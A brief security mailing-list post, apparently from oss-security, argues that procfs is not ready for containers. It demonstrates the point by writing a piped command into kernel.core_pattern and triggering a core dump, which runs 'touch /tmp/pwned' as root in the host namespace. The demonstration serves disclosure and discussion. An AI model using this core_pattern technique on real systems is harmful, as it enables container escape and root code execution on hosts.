Why does it worth CVE?  Procfs is not ready for containers yet.  You can use other sysctls for more harmful things.  E.g. kernel.core_pattern allows arbitrary code execution as a full root - does it need a CVE too then? :-)  root@...-ubuntu:/proc/sys/kernel# echo "|/usr/bin/touch /tmp/pwned" > core_pattern root@...-ubuntu:/proc/sys/kernel# cat  ^\Quit (core dumped)  (In the root namespace) $ ls /tmp/pwned /tmp/pwned  --  Vasiliy Kulikov http://www.openwall.com - bringing security into open computing environments  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
